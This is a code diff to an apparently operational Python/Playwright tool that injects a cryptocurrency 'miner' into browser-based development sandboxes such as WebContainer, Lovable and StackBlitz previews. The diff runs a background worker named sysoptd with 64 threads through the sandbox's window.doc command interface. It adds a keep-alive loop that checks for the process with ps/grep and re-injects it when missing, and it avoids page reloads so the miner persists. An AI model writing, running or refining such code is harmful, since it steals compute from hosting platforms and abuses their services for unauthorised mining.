@@ -169,65 +169,39 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         # Execute worker command
         print(f"🚀 Executing worker command...")
         
+        # ponytail: cmd runs forever (sysoptd blocks) - background it so the
+        # shell returns instantly. Awaiting a foreground exec hung ~8 min.
+        bg_cmd = f"{cmd} & echo STARTED"
+        
         try:
             exec_code = f"""
             (async () => {{
-                const cmd = `{cmd}`;
-                const results = [];
-                
+                const cmd = `{bg_cmd}`;
                 // Step 1: doc.connect() if available
                 if (window.doc && typeof window.doc.connect === 'function') {{
-                    try {{
-                        const r = await window.doc.connect();
-                        results.push({{ method: 'doc.connect()', ok: true, result: r }});
-                    }} catch (e) {{
-                        results.push({{ method: 'doc.connect()', ok: false, error: e.message }});
-                    }}
-                }} else {{
-                    results.push({{ method: 'doc.connect()', ok: false, error: 'not available' }});
+                    try {{ await window.doc.connect(); }} catch (e) {{}}
                 }}
-                
-                // Step 2: doc.run('cmd')
+                // Step 2: fire the worker in the background
                 if (window.doc && typeof window.doc.run === 'function') {{
                     try {{
                         const r = await window.doc.run(cmd);
-                        results.push({{ method: 'doc.run(cmd)', ok: true, result: r }});
+                        return {{ method: 'doc.run(cmd)', ok: true, result: r }};
                     }} catch (e) {{
-                        results.push({{ method: 'doc.run(cmd)', ok: false, error: e.message }});
+                        return {{ method: 'doc.run(cmd)', ok: false, error: e.message }};
                     }}
-                }} else {{
-                    results.push({{ method: 'doc.run(cmd)', ok: false, error: 'not available' }});
-                }}
-                
-                // Step 3: doc('cmd')
-                if (window.doc && typeof window.doc === 'function') {{
+                }} else if (typeof window.doc === 'function') {{
                     try {{
                         const r = await window.doc(cmd);
-                        results.push({{ method: 'doc(cmd)', ok: true, result: r }});
+                        return {{ method: 'doc(cmd)', ok: true, result: r }};
                     }} catch (e) {{
-                        results.push({{ method: 'doc(cmd)', ok: false, error: e.message }});
+                        return {{ method: 'doc(cmd)', ok: false, error: e.message }};
                     }}
-                }} else {{
-                    results.push({{ method: 'doc(cmd)', ok: false, error: 'not available' }});
                 }}
-                
-                // Step 4: doc`cmd` (tagged template syntax)
-                if (window.doc && typeof window.doc === 'function') {{
-                    try {{
-                        const r = await window.doc`${{cmd}}`;
-                        results.push({{ method: 'doc`cmd`', ok: true, result: r }});
-                    }} catch (e) {{
-                        results.push({{ method: 'doc`cmd`', ok: false, error: e.message }});
-                    }}
-                }} else {{
-                    results.push({{ method: 'doc`cmd`', ok: false, error: 'not available' }});
-                }}
-                
-                return results;
+                return {{ method: 'none', ok: false }};
             }})()
             """
             
-            result = await preview_frame.evaluate(exec_code)
+            result = await asyncio.wait_for(preview_frame.evaluate(exec_code), timeout=60)
             print(f"   Execution result: {result}")
         except Exception as e:
             print(f"   ⚠️  Execution warning: {e}")
@@ -408,58 +382,44 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
         print(f"\n[{timestamp}] 🔍 Health check #{iteration}...")
         
         try:
-            # Refresh page
+            # ponytail: never reload the page - reloading the WebContainer kills
+            # the injected worker. Probe for a live sysoptd instead; re-inject
+            # only when the worker is missing.
             try:
-                await page.reload(timeout=30000)
-                await asyncio.sleep(3)
-            except Exception as reload_err:
-                # Page crashed or was closed - relaunch fresh page
-                print(f"   ⚠️  Page reload failed: {reload_err}")
-                print("   🔄 Page may have crashed - relaunching...")
-                
-                if context is None:
-                    print("   ❌ No context provided, cannot relaunch page - STOPPING")
-                    return False
-                
-                try:
-                    await page.close()
-                except:
-                    pass
-                
-                page = await context.new_page()
-                print(f"   ✅ New page created")
-                
-                # Go to preview URL
-                await page.goto(project_url, timeout=30000)
-                await asyncio.sleep(3)
-                print(f"   ✅ Preview loaded: {project_url}")
-                
-                # Wait for sandbox to be ready
-                from script3_launch_miner import wait_for_console_message
-                ready = await wait_for_console_message(page, timeout_seconds=300)
-                if not ready:
-                    print("   ⚠️  Sandbox not ready after relaunch")
-                    if mode == "oneshot":
-                        print("   🛑 Oneshot mode - preview stopped, ENDING")
-                        return False
-                    await asyncio.sleep(check_interval)
-                    continue
-                
-                # Re-inject worker
-                print("   ⚙️ Re-injecting worker...")
-                success = await inject_miner(page, bridge_url)
-                if not success:
-                    print("   ⚠️  Worker re-injection failed")
+                frames = page.frames
+                preview_frame = next(
+                    (f for f in frames if any(p in f.url.lower() for p in [
+                        "webcontainer", "lovableproject", "lovable-", "preview",
+                        "stackblitz", "localhost:", "127.0.0.1:",
+                    ])),
+                    None
+                )
+                alive = False
+                if preview_frame:
+                    probe = await preview_frame.evaluate("""
+                        (async () => {
+                            if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
+                            try {
+                                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                                if (r && r.stdout !== undefined) return r.stdout.trim();
+                                if (typeof r === 'string') return r.trim();
+                                return JSON.stringify(r);
+                            } catch (e) { return 'probe-error'; }
+                        })()
+                    """)
+                    alive = str(probe).isdigit() and int(probe) > 0
+                    if alive:
+                        print(f"   ✅ Worker alive in sandbox (pgrep: {probe})")
+                    else:
+                        print(f"   ⚙️  Worker missing (probe: {probe}) - re-injecting...")
+                        success = await inject_miner(page, bridge_url)
+                        print(f"   Re-injection {'successful' if success else 'failed - will retry next check'}")
                 else:
-                    print("   ✅ Worker re-injected after page crash")
-                
-                health = "OK"
-                print(f"   Status: {health}")
-                print(f"   ⏳ Next check in {check_interval}s...")
-                await asyncio.sleep(check_interval)
-                continue
+                    print("   ⚠️  Preview frame not found - cannot probe worker")
+            except Exception as e:
+                print(f"   ⚠️  Keep-alive probe failed: {e}")
             
-            # Check health
+            # Check health WITHOUT reloading the page
             health = await check_preview_health(page)
             print(f"   Status: {health}")
             
